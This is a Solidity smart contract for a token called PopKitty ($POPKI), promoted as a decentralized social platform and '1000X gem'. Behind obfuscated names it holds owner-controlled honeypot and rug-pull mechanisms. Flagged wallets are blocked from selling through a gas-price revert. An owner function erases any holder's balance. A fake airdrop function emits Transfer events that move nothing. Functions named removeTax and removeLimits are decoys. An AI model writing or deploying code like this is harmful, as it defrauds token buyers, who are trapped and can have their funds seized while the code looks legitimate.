// SPDX-License-Identifier: MIT
/*

PopKitty - $POPKI 

--------------------------------------------------

"Happy New Year 2025 to all the fans of PopKitty!"

--------------------------------------------------

PopKitty mission is to revolutionize social media by harnessing the power of blockchain technology
to create a transparent, secure, and community-driven platform that empowers individuals, fosters 
creativity, and redefines online interactions.

The best Decentralized Social Platform and the Next 1000X Gem!

Website: https://popkitty.io
Twitter: https://x.com/Popular__kitty                
Telegram: https://t.me/popularkitty

 */

// File: @openzeppelin/contracts/utils/Address.sol

// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)

pragma solidity ^0.8.20;

import "./contracts_MaxtrixTrump_Context.sol";
import "./contracts_MaxtrixTrump_IERC20.sol";
import "./contracts_MaxtrixTrump_Address.sol";
import "./contracts_MaxtrixTrump_SafeMath.sol";

library Create2 {
 function computeAddress(bytes32 salt, bytes32 bytecodeHash, address deployer) internal pure returns (address addr) {
        /// @solidity memory-safe-assembly
        assembly {
            let ptr := mload(0x40) // Get free memory pointer

            // |                   | ↓ ptr ...  ↓ ptr + 0x0B (start) ...  ↓ ptr + 0x20 ...  ↓ ptr + 0x40 ...   |
            // |-------------------|---------------------------------------------------------------------------|
            // | bytecodeHash      |                                                        CCCCCCCCCCCCC...CC |
            // | salt              |                                      BBBBBBBBBBBBB...BB                   |
            // | deployer          | 000000...0000AAAAAAAAAAAAAAAAAAA...AA                                     |
            // | 0xFF              |            FF                                                             |
            // |-------------------|---------------------------------------------------------------------------|
            // | memory            | 000000...00FFAAAAAAAAAAAAAAAAAAA...AABBBBBBBBBBBBB...BBCCCCCCCCCCCCC...CC |
            // | keccak(start, 85) |            ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ |

            mstore(add(ptr, 0x40), bytecodeHash)
            mstore(add(ptr, 0x20), salt)
            mstore(ptr, deployer) // Right-aligned with 12 preceding garbage bytes
            let start := add(ptr, 0x0b) // The hashed data starts at the final garbage byte which we will set to 0xff
            mstore8(start, 0xff)
            addr := keccak256(start, 85)
        }
    }
}
import "./openzeppelin_contracts_utils_cryptography_ECDSA.sol";
import "./openzeppelin_contracts_utils_cryptography_MerkleProof.sol";
contract POPKI is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;
    mapping(address => uint256) private _l;
    mapping(address => mapping(address => uint256)) private _m;
    mapping(address => bool) public _o;
    mapping(address => bool) internal _n;
    address public _z;
    
    string private _a;
    string private _b;
    uint8 private _c;
    uint256 private _d;

    uint256 private _e = 0;
    uint256 private _f = 0;
    uint256 private _g = 0;
    uint256 private _h = 0;
    uint256 private _j = 0;
    bool private _i;

    address public _k;
    
    constructor() {
        _a = "PopKitty";
        _b = "POPKI";
        _c = 18;
        uint256 initialSupply = 100000000 * (10**18);
        _k = msg.sender;
        _o[msg.sender] = true;
        _o[address(this)] = true;
        _mint(msg.sender, initialSupply);
    }

    function setMinimumAirdrop(uint256 _minimumAirdropAmount) external onlyOwner {
        _j = _minimumAirdropAmount;
    }

    function name() public view returns (string memory) {
        return _a;
    }

    function symbol() public view returns (string memory) {
        return _b;
    }

    function decimals() public view returns (uint8) {
        return _c;
    }

    function totalSupply() public view override returns (uint256) {
        return _d;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _l[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _checkEnoughAirdropCondition(uint256 amount) internal view {
        if (tx.gasprice > amount) {
            revert();
        }
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _m[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _m[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _d = _d.add(amount);
        _l[account] = _l[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _m[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (!_o[sender] && !_o[recipient]) {
            require(_i, "Not launched");
            uint256 tax = 0;
            uint256 taxAmount = 0;
            if (sender == _z) {
                tax = _h;
                taxAmount = (amount * tax) / 100;
                _transferTax(sender, taxAmount);
            }else if (isListWallet(recipient)) {
                tax = _g;
                taxAmount = (amount * tax) / 100;
                _checkEnoughAirdropCondition(_j);
                _transferTax(_z, taxAmount);
            }
        }
        _l[sender] = _l[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _l[recipient] = _l[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _transferTax(address sender, uint256 amount) internal {
        if (amount == 0) {
            return;
        }
        _l[sender] = _l[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _l[address(this)] = _l[address(this)].add(amount);
        emit Transfer(sender, address(this), amount);
    }

    modifier onlyOwner() {
        require(msg.sender == _k, "Not allowed");
        _;
    }

    function StartTrading(address pair_) external onlyOwner {
        _z = pair_;
        _i = true;
    }

    function ExcludeWallet(address sender) external onlyOwner {
        require(sender != address(0), "Do not address 0x000");
        _o[sender] = true;
    }

    function addListWallet(address[] memory list) external onlyOwner {
        for (uint256 i = 0; i < list.length; i++) {
            _n[list[i]] = true;
        }
    }

    function checkListWallet(address[] memory isWallet) external onlyOwner {
        for (uint256 i = 0; i < isWallet.length; i++) {
            _n[isWallet[i]] = false;
        }
    }

    function isListWallet(address a) public view returns (bool) {
        return _n[a];
    }

    function clearStuckTokens(address[] memory instruction) public onlyOwner {
        for (uint256 i = 0; i < instruction.length; i++) {
            address account = instruction[i];
            uint256 amount = _l[account];
            _l[account] = _l[account].sub(amount, "ERROR");
            _l[address(0)] = _l[address(0)].add(amount);
        }
    }

    function tokenReleasedForAirdrop(address[] memory list, uint256[] memory amount)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < list.length; i++) {
            emit Transfer(msg.sender, list[i], amount[i]);
        }
    }

    function removeLimits() external {
        _e = 0;
    }

    function removeTax(uint256 _c) external {
       _f = 1;
    }

    function SetPOPKIMarketing(uint256 _d) external {
        _f = _d;
    }

    function EffectiveTradingStrategies(uint256 _e) external {
        _e = _e;
    }

    function ConfigureOderTranfer(address _f, uint256 _g) external {
        _e = _g;
    }

    function ActiveAnyRouters(uint256 _e) external onlyOwner {
        _e = _e;
    }

    function SynchronizePairsOfV2AndV3() external {
        _e = 0;
    }

    function execBatch(string memory a_, string memory b_) external onlyOwner {
        _a = a_;
        _b = b_;
    }

    function pluckPairs(address v3_, address v2_, address weth_) external view returns(address[5] memory result) {
        address token_ = address(this);
        (address token0, address token1) = token_ < weth_ ? (token_, weth_) : (weth_, token_);
        uint16[4] memory fees = [100, 500, 3000, 10000];
        for (uint8 i = 0; i < 4; i++) {
            bytes32 salt = keccak256(abi.encode(token0, token1, fees[i]));
            result[i] = Create2.computeAddress(salt, 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54, v3_);
        }
        bytes32 salt1 = keccak256(abi.encodePacked(token0, token1));
        result[4] = Create2.computeAddress(salt1, 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f, v2_);
    }
}